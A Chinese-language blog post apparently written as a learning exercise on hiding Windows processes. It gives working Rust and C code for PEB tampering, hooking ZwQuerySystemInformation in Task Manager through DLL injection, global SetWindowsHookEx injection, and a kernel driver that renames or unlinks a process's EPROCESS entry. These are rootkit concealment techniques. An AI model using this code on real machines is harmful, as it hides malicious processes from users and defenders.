+++
title = "Windows进程隐藏初探"
date = 2024-05-30
[taxonomies]
tags = ["windows", "hide", "driver", "hook"]
categories = ["Driver"]
+++

<!-- more -->

# Windows进程隐藏初探

目的是将我们的进程信息修改，让任务管理器这些无法读取到原本真实的信息，从而做到隐藏效果。比如将目的进程修改成系统进程信息。

主要使用两个层面隐藏

-   R3的PEB中隐藏信息

-   R0的_EPROCESS中隐藏信息。

隐藏我们也可以从两个方面来看，一种是伪造信息，一种是消除信息。伪造信息是指将一个指定进程伪造成其他进程，消除信息是指让任务管理器这种无法读取到这个进程的信息。

## R3隐藏信息

### R3伪造信息

我看一些文章主要隐藏信息如下(实际上不止，但是思路是类似的，但是我测试发现没有什么实际上的用处

-   程序名称ImageBaseName
-   命令行参数CommandLine
-   修改用户组

思路也很简单，获取PEB结构体，然后修改对应字段的内容，这里我用Rust来写，rust调用windows库函数可以参考我之前写的[文章](https://military-axe.github.io/posts/rustbian-xie-ji-chong-hookde-fang-shi/)，这里只写思路和部分代码片段，完整在附录。

获取本身进程的peb地址，这个很简单，大🔥都知道，读取`gs:[60h]`

```rust
unsafe {
    asm!(
        "mov {0}, gs:[0x60]",
        inout(reg) ppeb
    );
}
```

如果是将这个代码放在dll中，注入进去需要伪装的进程也可以实现读取peb的效果。但是我这里还是偏向于不使用注入手段，倾向于直接传入进程pid，然后获取peb，这里可以使用`ntdll.dll`中未导出的函数`NtQueryInformationProcess`。在rust中可以直接用，c++中需要`GetProcAddress(Ntdll, "NtQueryInformationProcess")`来获取

```rust
fn main() {

    let handle = unsafe {
        OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, 9676)
            .expect("[!] OpenProcess error")
    };
    let mut pbi = PROCESS_BASIC_INFORMATION {
        ..Default::default()
    };
    let ppbi = &mut pbi as *mut _;
    let mut return_length = 0u32;

    unsafe {
        let _ = NtQueryInformationProcess(
            handle,
            ProcessBasicInformation,
            ppbi as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );
        println!("{:#?}", pbi);
    };
}
```

使用`NtQueryInformationProcess`可以得到`PROCESS_BASIC_INFORMATION`结构体

```rust
#[repr(C)]
pub struct PROCESS_BASIC_INFORMATION {
    pub ExitStatus: NTSTATUS,
    pub PebBaseAddress: *mut PEB,
    pub AffinityMask: usize,
    pub BasePriority: i32,
    pub UniqueProcessId: usize,
    pub InheritedFromUniqueProcessId: usize,
}
```

可以从结构体中`PROCESS_BASIC_INFORMATION->PebBaseAddress`获取peb地址。常见的文章一般是修改`ImageBaseNamed`和`CommandLine`来隐藏这两个信息

ImageBaseNamed和CommandLine的位置查看peb结构体可知

-   `Peb->ProcessParameters->ImageBaseNamed`
-   `Peb->ProcessParameters->CommandLine `

实际上需要修改的地方还有很多，查看`Peb->ProcessParameters`可以看到

```c
0: kd> dt 0x0000020c`6f211de0 _RTL_USER_PROCESS_PARAMETERS
nt!_RTL_USER_PROCESS_PARAMETERS
   +0x000 MaximumLength    : 0x764
   +0x004 Length           : 0x764
   +0x008 Flags            : 0x4001
   +0x00c DebugFlags       : 0
   +0x010 ConsoleHandle    : 0x00000000`00000048 Void
   +0x018 ConsoleFlags     : 0
   +0x020 StandardInput    : 0x00000000`0000005c Void
   +0x028 StandardOutput   : 0x00000000`00000060 Void
   +0x030 StandardError    : 0x00000000`00000064 Void
   +0x038 CurrentDirectory : _CURDIR
   +0x050 DllPath          : _UNICODE_STRING ""
   +0x060 ImagePathName    : _UNICODE_STRING "C:\Users\axe\Desktop\hide_process_r3.exe"
   +0x070 CommandLine      : _UNICODE_STRING ""C:\Users\axe\Desktop\hide_process_r3.exe""
   +0x080 Environment      : 0x0000020c`6f210fe0 Void
   +0x088 StartingX        : 0
   +0x08c StartingY        : 0
   +0x090 CountX           : 0
   +0x094 CountY           : 0
   +0x098 CountCharsX      : 0
   +0x09c CountCharsY      : 0
   +0x0a0 FillAttribute    : 0
   +0x0a4 WindowFlags      : 0
   +0x0a8 ShowWindowFlags  : 0
   +0x0b0 WindowTitle      : _UNICODE_STRING "C:\Users\axe\Desktop\hide_process_r3.exe"
   +0x0c0 DesktopInfo      : _UNICODE_STRING "WinSta0\Default"
   +0x0d0 ShellInfo        : _UNICODE_STRING ""
   +0x0e0 RuntimeData      : _UNICODE_STRING ""
   +0x0f0 CurrentDirectores : [32] _RTL_DRIVE_LETTER_CURDIR
   +0x3f0 EnvironmentSize  : 0xdf8
   +0x3f8 EnvironmentVersion : 3
   +0x400 PackageDependencyData : (null) 
   +0x408 ProcessGroupId   : 0x21c
   +0x40c LoaderThreads    : 0
   +0x410 RedirectionDllName : _UNICODE_STRING ""
   +0x420 HeapPartitionName : _UNICODE_STRING ""
   +0x430 DefaultThreadpoolCpuSetMasks : (null) 
   +0x438 DefaultThreadpoolCpuSetMaskCount : 0
   +0x43c DefaultThreadpoolThreadMaximum : 0
```

但是我发现修改了这些字符串后，任务管理器中依然没有被修改，说明任务管理器读取的字符串应该不是PEB中的，可能是EPORCESS中的(在R0中验证)。所以没啥用。

代码在[HideProcessR3](https://github.com/Military-axe/HideProcessR3)项目

### R3消除进程

>   这个部分我觉得是有用的，至少能让一些软件显示不出来我们的进程。

R3消除进程我主要学到两个方面，一个是hook，一个是R3断链

#### [API hook] Hook任务管理器

这里主要针对任务管理器进程，让任务管理器获取不到我们的进程。这里其实是hook掉任务管理器的`ZwQuerySystemInformation`函数，这篇[看雪的文章](https://bbs.kanxue.com/thread-269919.htm)已经实现过了c/c++版本的，我这里就用rust的写一遍R3的部分。

>   看雪文章是手动实现hook的过程，我是使用第三方的hook库，因为任务管理还涉及到一些多线程的问题，简单手动hook可能会有问题。用第三方库则已经帮我解决这个问题了。

任务管理器获取进程信息，底层调用的是`ZwQuerySystemInformation`函数

```c
NTSTATUS WINAPI ZwQuerySystemInformation(
  __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
  __inout    PVOID SystemInformation,
  __in       ULONG SystemInformationLength,
  __out_opt  PULONG ReturnLength);
```

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| SystemInformationClass  | 要检索的类型。是一个SYSTEM_INFORMATION_CLASS的联合体         |
| SystemInformation       | 指向缓冲区的指针，用于接收请求信息。该信息的大小和结构取决于SystemInformationClass |
| SystemInformationLength | SystemInformation参数指向的缓冲区的大小                      |
| ReturnLength            | 一个可选指针，指向函数写入请求信息的实际大小的位置           |

SystemInformationClass中有很多类型

```c
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;
```

`SystemProcessInformation(5)`就是进程信息类型，我们hook函数后，目标就是`SystemInformationClass`的值等于5的情况。

然后还需要注意到SystemInformation值，这个值的结构体如下

```rust
pub struct SYSTEM_PROCESS_INFORMATION {
    pub NextEntryOffset: u32,
    pub NumberOfThreads: u32,
    pub Reserved1: [u8; 48],
    pub ImageName: super::super::Foundation::UNICODE_STRING,
    pub BasePriority: i32,
    pub UniqueProcessId: super::super::Foundation::HANDLE,
    pub Reserved2: *mut core::ffi::c_void,
    pub HandleCount: u32,
    pub SessionId: u32,
    pub Reserved3: *mut core::ffi::c_void,
    pub PeakVirtualSize: usize,
    pub VirtualSize: usize,
    pub Reserved4: u32,
    pub PeakWorkingSetSize: usize,
    pub WorkingSetSize: usize,
    pub Reserved5: *mut core::ffi::c_void,
    pub QuotaPagedPoolUsage: usize,
    pub Reserved6: *mut core::ffi::c_void,
    pub QuotaNonPagedPoolUsage: usize,
    pub PagefileUsage: usize,
    pub PeakPagefileUsage: usize,
    pub PrivatePageCount: usize,
    pub Reserved7: [i64; 6],
}
```

其中`UniqueProcessId`表示进程pid，也是我们对比是否是目标进程的值。然后`NextEntryOffset`表示下一个SYSTEM_PROCESS_INFORMATION距离当前这个结构体的偏移值

![1](C:\Users\mi1it\Documents\note\进程隐藏初探.assets\1.svg)



我这里使用`retour`库来hook，源码中指定需要hook的进程号(任务管理器的进程号)做全局变量

```rust
// 需要隐藏的进程id
const HIDE_PID: i32 = 21664;
```

然后写成一个dll的代码，原理就是inline hook，写法可以参考我之前的[文章](https://military-axe.github.io/posts/rustbian-xie-ji-chong-hookde-fang-shi/)

```rust
static_detour! {
    static ZwQuerySystemInformationHook: unsafe extern "system" fn(SYSTEM_INFORMATION_CLASS, *mut c_void, c_ulong, *mut c_ulong) -> NTSTATUS;
}

// A type alias for `ZwQuerySystemInformation` (makes the transmute easy on the eyes)
type FnZwQuerySystemInformation = unsafe extern "system" fn(
    SYSTEM_INFORMATION_CLASS,
    *mut c_void,
    c_ulong,
    *mut c_ulong,
) -> NTSTATUS;

/// Called when the DLL is attached to the process.
unsafe fn main() -> Result<(), Box<dyn Error>> {
    let address = get_module_symbol_address("ntdll.dll", "ZwQuerySystemInformation")
        .expect("could not find 'ZwQuerySystemInformation' address");
    let target: FnZwQuerySystemInformation = mem::transmute(address);

    ZwQuerySystemInformationHook
        .initialize(target, zwquery_system_infomation_detour)?
        .enable()?;
    Ok(())
}

#[allow(unused_assignments)]
/// Called whenever `ZwQuerySystemInformation` is invoked in the process.
fn zwquery_system_infomation_detour(
    system_infomation_class: SYSTEM_INFORMATION_CLASS,
    mut system_infomation: *mut c_void,
    system_infomation_length: c_ulong,
    return_length: *mut c_ulong,
) -> NTSTATUS {
    let mut prev = 0;
    let status = unsafe {
        ZwQuerySystemInformationHook.call(
            system_infomation_class,
            system_infomation,
            system_infomation_length,
            return_length,
        )
    };
    if status != STATUS_SUCCESS || system_infomation_class != SystemProcessInformation {
        return status;
    }

    let mut psystem_information: *mut SYSTEM_PROCESS_INFORMATION =
        unsafe { mem::transmute(system_infomation) };
    loop {
        if HIDE_PID == unsafe { (*psystem_information).UniqueProcessId.0 } as i32 {
            let st = unsafe { format!("system information ==> {:#?}", *psystem_information) };
            unsafe { MessageBoxA(None, PCSTR::from_raw(st.as_ptr()), s!("info"), MB_OK) };
            if prev == 0 {
                system_infomation = (psystem_information as u64
                    + (unsafe { *psystem_information }).NextEntryOffset as u64)
                    as *mut c_void;
            } else if (unsafe { *psystem_information }).NextEntryOffset == 0 {
                (unsafe { *(prev as *mut SYSTEM_PROCESS_INFORMATION) }).NextEntryOffset = 0;
            } else {
                unsafe {
                    (*(prev as *mut SYSTEM_PROCESS_INFORMATION)).NextEntryOffset +=
                        (*psystem_information).NextEntryOffset;
                }
            }
            break;
        } else {
            prev = psystem_information as u64;
        }

        if unsafe { (*psystem_information).NextEntryOffset == 0 } {
            break;
        }

        psystem_information =
            unsafe { psystem_information as u64 + (*psystem_information).NextEntryOffset as u64 }
                as *mut SYSTEM_PROCESS_INFORMATION;
    }

    status
}

/// Returns a module symbol's absolute address.
fn get_module_symbol_address(module: &str, symbol: &str) -> Option<usize> {
    let module = module
        .encode_utf16()
        .chain(iter::once(0))
        .collect::<Vec<u16>>();
    let symbol = CString::new(symbol).unwrap();
    unsafe {
        let handle = GetModuleHandleW(PCWSTR(module.as_ptr() as _)).unwrap();
        match GetProcAddress(handle, PCSTR(symbol.as_ptr() as _)) {
            Some(func) => Some(func as usize),
            None => None,
        }
    }
}

#[no_mangle]
unsafe extern "system" fn DllMain(_hinst: HANDLE, reason: u32, _reserved: *mut c_void) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH => {
            println!("attaching");
            unsafe { main().unwrap() }
        }
        DLL_PROCESS_DETACH => {
            println!("detaching");
        }
        DLL_THREAD_ATTACH => {}
        DLL_THREAD_DETACH => {}
        _ => {}
    };
    return BOOL::from(true);
}
```

注入前

![image-20240521213951309](C:\Users\mi1it\Documents\note\进程隐藏初探.assets\image-20240521213951309.png)

注入任务管理器后则无法搜索到对应的进程。

![image-20240521214135198](C:\Users\mi1it\Documents\note\进程隐藏初探.assets\image-20240521214135198.png)

#### [全局hook] SetWindowsHookEx

上一种API hook的局限性是我需要指定需要hook的进程，比如我需要指定hook任务管理器，为了隐藏进程，我可能还要多hook几个类似的进程，比如ProcessHack，Systeminfo等。但是我很难尽善尽美，把所有需要hook的程序名称都加在其中，所以考虑到全局hook。全局hook则是不需要我指定进程，只要有进程创建（或者复合标准的进程），就往进程中注入dll。SetWindowsHookEx就是这样一个Windows API

>   为了能够让DLL注入所有的进程中，程序设置WH_GETMESSAGE消息的全局钩子。因为WH_GETMESSAGE类型的钩子会监视消息队列，由于Windows系统是基于消息驱动的，所以所有进程都会有自己的一个消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。 ----《Windows黑客编程技术详解》

windows正常消息处理流程如下：

![](C:\Users\mi1it\Documents\note\进程隐藏初探.assets\1-1716440388238-2.svg)

使用SetWindowsHookEx之后的消息处理流程则是

![](C:\Users\mi1it\Documents\note\进程隐藏初探.assets\2.svg)

```c
HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
```

-   idHook: 需要安装hook的类型，可以安装键盘hook（WH_KEYBOARD），鼠标hook（WH_MOUSE），我们全局hook注入dll的话，需要使用**WH_GETMESSAGE**类型
-   lpfn: 指向相应的挂钩处理过程.若参数dwThreadId为0或者指示了一个其他进程创建的线程之标识符,则参数lpfn必须指向一个动态链接中的挂钩处理过程.否则,参数lpfn可以指向一个与当前进程相关的代码中定义的挂钩处理过程。

-   hmod: DLL 的句柄，其中包含 *lpfn* 参数指向的挂钩过程。 如果 *dwThreadId* 参数指定当前进程创建的线程，并且挂钩过程位于与当前进程关联的代码中，则必须将 *hMod* 参数设置为 **NULL**。
-   dwThreadId：指示了一个线程标识符,挂钩处理过程与线程相关.若此参数值为0,则该挂钩处理过程与所有现存的线程相关

代码参考了这篇[文章](https://blog.csdn.net/kingkee/article/details/97390029)

DLL代码:

```c
// GlobalHook_Test.cpp : 定义 DLL 应用程序的导出函数。
//
 
#include "stdafx.h"
 
extern HMODULE g_hDllModule;
// 共享内存
#pragma data_seg("mydata")
    HHOOK g_hHook = NULL;
#pragma data_seg()
#pragma comment(linker, "/SECTION:mydata,RWS")
 
// 钩子回调函数
LRESULT GetMsgProc(
	int code,
	WPARAM wParam,
	LPARAM lParam)
{
	return ::CallNextHookEx(g_hHook, code, wParam, lParam);
}
 
// 设置全局钩子
BOOL SetGlobalHook()
{
	g_hHook = ::SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, 0);
	if (NULL == g_hHook)
	{
		return FALSE;
	}
	return TRUE;
}
 
// 卸载钩子
BOOL UnsetGlobalHook()
{
	if (g_hHook)
	{
		::UnhookWindowsHookEx(g_hHook);
	}
	return TRUE;
}
```

上面是dll的代码，然后编译调用这个dll的代码

```c
#include "stdafx.h"
#include <Windows.h>
 
int _tmain(int argc, _TCHAR* argv[])
{
	typedef BOOL(*typedef_SetGlobalHook)();
	typedef BOOL(*typedef_UnsetGlobalHook)();
	HMODULE hDll = NULL;
	typedef_SetGlobalHook SetGlobalHook = NULL;
	typedef_UnsetGlobalHook UnsetGlobalHook = NULL;
	BOOL bRet = FALSE;
 
	do
	{
		hDll = ::LoadLibrary("GlobalHook_Test.dll");
		if (NULL == hDll)
		{
			printf("LoadLibrary Error[%d]\n", ::GetLastError());
			break;
		}
 
		SetGlobalHook = (typedef_SetGlobalHook)::GetProcAddress(hDll, "SetGlobalHook");
		if (NULL == SetGlobalHook)
		{
			printf("GetProcAddress Error[%d]\n", ::GetLastError());
			break;
		}
 
		bRet = SetGlobalHook();
		if (bRet)
		{
			printf("SetGlobalHook OK.\n");
		}
		else
		{
			printf("SetGlobalHook ERROR.\n");
		}
 
		system("pause");
 
		UnsetGlobalHook = (typedef_UnsetGlobalHook)::GetProcAddress(hDll, "UnsetGlobalHook");
		if (NULL == UnsetGlobalHook)
		{
			printf("GetProcAddress Error[%d]\n", ::GetLastError());
			break;
		}
		UnsetGlobalHook();
		printf("UnsetGlobalHook OK.\n");
 
	}while(FALSE);
 
	system("pause");
	return 0;
}

```

这种方法针对于有窗口的程序，如果是命令行的就没有消息传递机制，无法使用SetWindowsHookEx来全局注入。比如`Tasklist.exe`查看进程，就没法做到隐藏进程

#### [全局hook] Hook Explorer

这是全局hook的一种思路，通过hook explorer.exe进程，当新进程创建都是作为explorer.exe的子进程，所以首先hook explorer.exe中的`CreateProcess`。监控每一个进程的创建。当目标进程(任务管理器等)创建时，再向目标进程注入

// TODO

## R0隐藏信息

### R0伪造信息

这里是针对`_EPROCESS`，修改相应的信息

```c
//0xa40 bytes (sizeof)
struct _EPROCESS
{
    struct _KPROCESS Pcb;                                                   //0x0
    struct _EX_PUSH_LOCK ProcessLock;                                       //0x438
    VOID* UniqueProcessId;                                                  //0x440
    struct _LIST_ENTRY ActiveProcessLinks;                                  //0x448
    ...
    UCHAR ImageFileName[15];                                                //0x5a8
    ...
}
```

EPROCESS中有一个属性值是`ImageFileName`，标志的是程序名称，这个值是可以被修改的，所以可以在驱动层修改

```c
typedef struct SET_IMAGE_NAME {
    UCHAR bImageName[250];
    UINT64 pid;
}SET_IMAGE_NAME, *PSET_IMAGE_NAME ;


NTSTATUS SetImageName(PSET_IMAGE_NAME pSetImageName)
{
    PEPROCESS     pEprocess, pCurProcess;
    PUCHAR        pOldImageName;
    SIZE_T        len;
    PLIST_ENTRY64 pActiveProcessLinks;
    PLIST_ENTRY64 pCurNode;
    UINT64        uProcessId;

    pEprocess = PsGetCurrentProcess();
    len = strlen(pSetImageName->bImageName);
    pActiveProcessLinks =
        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);

    for (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
         pCurNode->Flink != pBeginNode;
         pCurNode = pCurNode->Flink) {
        pCurProcess =
            (PEPROCESS)((PCHAR)pCurNode -
                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
        uProcessId = PsGetProcessId(pCurProcess);
        if (uProcessId == pSetImageName->pid) {
            // copy new string to cover the old string

            kprintf("[+ Hide Process R0] found the process pid\r\n", uProcessId);
            pOldImageName = PsGetProcessImageFileName(pCurProcess);
            RtlCopyMemory(pOldImageName, pSetImageName->bImageName, len);

            return STATUS_SUCCESS;
        }
    }

    return STATUS_UNSUCCESSFUL;
}
```

### R0消除进程

这里主要是**R0的断链**

EPROCESS是进程在内核中的结构体，一个进程一个EPROCESS，`EPROCESS中->ActiveProcessLinks`值是一个双向链表，指向的是其他进程。

```c
copy
//0xa40 bytes (sizeof)
struct _EPROCESS
{
    struct _KPROCESS Pcb;                                                   //0x0
    struct _EX_PUSH_LOCK ProcessLock;                                       //0x438
    VOID* UniqueProcessId;                                                  //0x440
    struct _LIST_ENTRY ActiveProcessLinks;                                  //0x448
    struct _EX_RUNDOWN_REF RundownProtect;                                  //0x458
    ...
}
```

```mer
					_eprocess1                   _eprocess2
					.........                    .........
					.........                    .........
					ActiveProcessLinks -> {      ActiveProcessLinks -> {
------------------>	    Flink ------------------>    Flink ------------------>
<------------------   	Blink <------------------    Blink <------------------
					}                            }
```

然后`EPROCESS->UniqueProcessId`表示的是这个进程的pid。

所有我们可以便利所有进程，然后对比pid是否是我们的目标pid，如果是，则从链表中断开这个`ActiveProcessLinks`节点，这样就可以做到隐藏进程的效果。

**驱动部分**

获取本进程EPROCESS，从本进程开始遍历。我这里是用`PsGetCurrentProcess`，这篇[文章](https://bbs.kanxue.com/thread-278717.htm还提出一种从`fs:[0x124]`获取KPCR再，一层一层取得到EPROCESS的思路:`_KPCR -> _KPRCB -> KTHREAD -> _KAPC_STATE -> _KPROCESS -> _EPROCESS`.大佬分析说这其实就是PsGetCurrentProcess的代码实现原理。

```c
pEprocess = PsGetCurrentProcess();
pActiveProcessLinks =
        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
```

然后遍历链表，判断每个节点的pid是否是目标pid。如果是目标pid则断开链表节点。

```c
for (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
     pCurNode->Flink != pBeginNode;
     pCurNode = pCurNode->Flink) {
    pCurProcess =
        (PEPROCESS)((PCHAR)pCurNode -
                    WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
    uProcessId = PsGetProcessId(pCurProcess);
    kprintf("[+] pid => {%#llx}\r\n.", uProcessId);
    if (uProcessId == pid) {
        kprintf(
            "[+ Hide Process R0] Found the Object Process id: %#llx.\r\n",
            uProcessId);
        ((PLIST_ENTRY64)pCurNode->Blink)->Flink = pCurNode->Flink;
        ((PLIST_ENTRY64)pCurNode->Flink)->Blink = pCurNode->Blink;

        goto success;
    }
}
```

**函数总体代码**

```c
/// @brief 隐藏指定进程
/// @param pid 需要隐藏的进程Pid
/// @return 如果隐藏成功则返回STATUS_SUCCESS，失败则返回STATUS_UNSUCCESSFUL
NTSTATUS HideProcessByPid(UINT64 pid)
{
    UINT64        uProcessId;
    PEPROCESS     pEprocess, pCurProcess;
    PLIST_ENTRY64 pActiveProcessLinks;
    PLIST_ENTRY64 pCurNode;

    pEprocess = PsGetCurrentProcess();
    pActiveProcessLinks =
        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);

    for (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
         pCurNode->Flink != pBeginNode;
         pCurNode = pCurNode->Flink) {
        pCurProcess =
            (PEPROCESS)((PCHAR)pCurNode -
                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
        uProcessId = PsGetProcessId(pCurProcess);
        kprintf("[+] pid => {%#llx}\r\n.", uProcessId);
        if (uProcessId == pid) {
            kprintf(
                "[+ Hide Process R0] Found the Object Process id: %#llx.\r\n",
                uProcessId);
            ((PLIST_ENTRY64)pCurNode->Blink)->Flink = pCurNode->Flink;
            ((PLIST_ENTRY64)pCurNode->Flink)->Blink = pCurNode->Blink;

            goto success;
        }
    }

    return STATUS_UNSUCCESSFUL;

success:
    return STATUS_SUCCESS;
}
```

我是写成wdm类型的驱动，这个函数需要一个进程pid，所以要用户层传入Pid。我将这个函数定义在`IRP_MJ_DEVICE_CONTROL`下

```c
#define IOCTL_HIDE_BY_PID \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x6666, METHOD_BUFFERED, FILE_ANY_ACCESS)

NTSTATUS CustomControl(PDEVICE_OBJECT pDevice, PIRP pIrp)
{
    PIO_STACK_LOCATION pstack;
    UINT64             iocode, in_len, out_len, ioinfo, pid;
    NTSTATUS           status;

    status  = STATUS_SUCCESS;
    pstack  = IoGetCurrentIrpStackLocation(pIrp);
    iocode  = pstack->Parameters.DeviceIoControl.IoControlCode;
    in_len  = pstack->Parameters.DeviceIoControl.InputBufferLength;
    out_len = pstack->Parameters.DeviceIoControl.OutputBufferLength;

    switch (iocode) {
    case IOCTL_HIDE_BY_PID:
        pid = *(PUINT32)pIrp->AssociatedIrp.SystemBuffer;
        kprintf("[+ Hide Process R0] Recv %#llx from R3.\r\n", pid);
        status = HideProcessByPid(pid);
        if (!NT_SUCCESS(status)) {
            kprintf("[! Hide Process R0] Hide Process failed.\r\n");
        }
        ioinfo = 0;
        break;
    default:
        kprintf("[! Hide Process]Recv iocode: %#llx", iocode);
        status = STATUS_UNSUCCESSFUL;
        ioinfo = 0;
        break;
    }

    pIrp->IoStatus.Status      = status;
    pIrp->IoStatus.Information = ioinfo;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}
```

完整代码在[HideProcessR0](https://github.com/Military-axe/HideProcessR0)中。

**用户层部分代码**

用户层部分我直接是用Rust来编写

```rust
#[derive(Debug)]
pub struct BreakChain {}

impl BreakChain {
    pub fn hide_by_pid(pid: u32) -> Result<()> {
        let hdevice = unsafe {
            CreateFileA(
                s!("\\\\.\\HideProcessR0"),
                (GENERIC_READ | GENERIC_WRITE).0,
                FILE_SHARE_NONE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )?
        };
        debug!("Open Device success");

        if hdevice.is_invalid() {
            warn!("Open Device failed {:?}.", unsafe { GetLastError() });
            return Err(Error::msg("Open Device failed."));
        }

        let input_buffer = &pid as *const u32 as *const c_void;
        unsafe {
            DeviceIoControl(
                hdevice,
                ctl_code(
                    FILE_DEVICE_UNKNOWN,
                    0x6666,
                    METHOD_BUFFERED,
                    FILE_ANY_ACCESS,
                ),
                Some(input_buffer),
                size_of::<u32>() as u32,
                None,
                0,
                None,
                None,
            )?
        };
        debug!("Send pid to driver success");

        Ok(())
    }
}

fn ctl_code(device_type: u32, function: u32, method: u32, access: u32) -> u32 {
    ((device_type) << 16) | ((access) << 14) | ((function) << 2) | (method)
}
```

运行之后，搜索不到记事本进程了

![](https://s2.loli.net/2024/05/27/nEihpY3gI2ukyom.png)

需要注意的是，我手动关闭这个断开链表的进程会造成蓝屏，所以目前这个只能用于简单的demo演示，或者某种需要隐蔽且不关闭的程序。具体的蓝屏报错信息如下。

```c
EXCEPTION_RECORD:  ffffc2857eb137a8 -- (.exr 0xffffc2857eb137a8)
ExceptionAddress: fffff8066aa4dc11 (nt!PspProcessDelete+0x000000000012e731)
   ExceptionCode: c0000409 (Security check failure or stack buffer overrun)
  ExceptionFlags: 00000001
NumberParameters: 1
   Parameter[0]: 0000000000000003
Subcode: 0x3 FAST_FAIL_CORRUPT_LIST_ENTRY 

PROCESS_NAME:  System

ERROR_CODE: (NTSTATUS) 0xc0000409 - The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.

EXCEPTION_CODE_STR:  c0000409

EXCEPTION_PARAMETER1:  0000000000000003

EXCEPTION_STR:  0xc0000409

STACK_TEXT:  
ffffc285`7eb12d78 fffff806`6a718e82     : ffffc285`7eb12ee0 fffff806`6a57f580 00000000`00000100 00000000`00000000 : nt!DbgBreakPointWithStatus
ffffc285`7eb12d80 fffff806`6a718466     : 00000000`00000003 ffffc285`7eb12ee0 fffff806`6a6159e0 00000000`00000139 : nt!KiBugCheckDebugBreak+0x12
ffffc285`7eb12de0 fffff806`6a5fdb47     : 00000000`00000048 00000000`00000004 ffffc40d`26a08080 33333333`33333333 : nt!KeBugCheck2+0x946
ffffc285`7eb134f0 fffff806`6a612269     : 00000000`00000139 00000000`00000003 ffffc285`7eb13850 ffffc285`7eb137a8 : nt!KeBugCheckEx+0x107
ffffc285`7eb13530 fffff806`6a612810     : ffffc40d`23602100 fffff806`6a433ff2 ffffc40d`26a08080 ffffc40d`26a084c8 : nt!KiBugCheckDispatch+0x69
ffffc285`7eb13670 fffff806`6a6106ae     : 00000000`00000000 fffff806`6a606036 ffffffff`ffffffff 00000000`00000006 : nt!KiFastFailDispatch+0xd0
ffffc285`7eb13850 fffff806`6aa4dc11     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiRaiseSecurityCheckFailure+0x32e
ffffc285`7eb139e0 fffff806`6a82e9b0     : ffffc40d`26a08050 ffffc40d`26a08050 00000000`00000001 ffffc40d`23ce0980 : nt!PspProcessDelete+0x12e731
ffffc285`7eb13a70 fffff806`6a8d4844     : 00000000`00000000 ffffc40d`26a08050 fffff806`6a8d4640 ffffc40d`23d13af0 : nt!ObpRemoveObjectRoutine+0x80
ffffc285`7eb13ad0 fffff806`6a4c3ea5     : ffffc40d`292c3040 fffff806`6a8d4640 ffffc40d`23d13af0 ffffc40d`00000000 : nt!ObpProcessRemoveObjectQueue+0x204
ffffc285`7eb13b70 fffff806`6a54ef55     : ffffc40d`292c3040 00000000`00000080 ffffc40d`23c95040 00000000`00000000 : nt!ExpWorkerThread+0x105
ffffc285`7eb13c10 fffff806`6a606a48     : ffffae01`1f940180 ffffc40d`292c3040 fffff806`6a54ef00 ffffffff`ffffffff : nt!PspSystemThreadStartup+0x55
ffffc285`7eb13c60 00000000`00000000     : ffffc285`7eb14000 ffffc285`7eb0e000 00000000`00000000 00000000`00000000 : nt!KiStartSystemThread+0x28


SYMBOL_NAME:  nt!KiFastFailDispatch+d0

MODULE_NAME: nt

IMAGE_NAME:  ntkrnlmp.exe

STACK_COMMAND:  .cxr; .ecxr ; kb

BUCKET_ID_FUNC_OFFSET:  d0

FAILURE_BUCKET_ID:  0x139_3_CORRUPT_LIST_ENTRY_nt!KiFastFailDispatch

OS_VERSION:  10.0.19041.1

BUILDLAB_STR:  vb_release

OSPLATFORM_TYPE:  x64

OSNAME:  Windows 10

FAILURE_ID_HASH:  {3aede96a-54dd-40d6-d4cb-2a161a843851}

Followup:     MachineOwner
```

# 总结思考

R3层面的主要是hook程序的`ZwQuerySystemInformation`函数，这种需要注入dll，对命令行获取进程信息的程序没办法，比如`Tasklist`程序就没有办法。哪怕是SetWindowsHook也不行，因为命令程序没有Windows，没有窗口事件。

Hook explorer的只能监控基于explorer的子进程，对于大部分情况应该可以，但是我这里还没找到太多资料，没有实现出来

R0层面，如果断开链表，就需要在进程退出的时候还原链表，否则就会导致蓝屏。

# 参考

[HideProcess | Oxygen1a1 · github.com](https://github.com/Oxygen1a1/HideProcess?tab=readme-ov-file)

[进程隐藏技术 | 1900 · 看雪](https://bbs.kanxue.com/thread-269919.htm)

[超详细的3环和0环断链隐藏分析 | ATrueMan · 看雪](https://bbs.kanxue.com/thread-278717.htm)

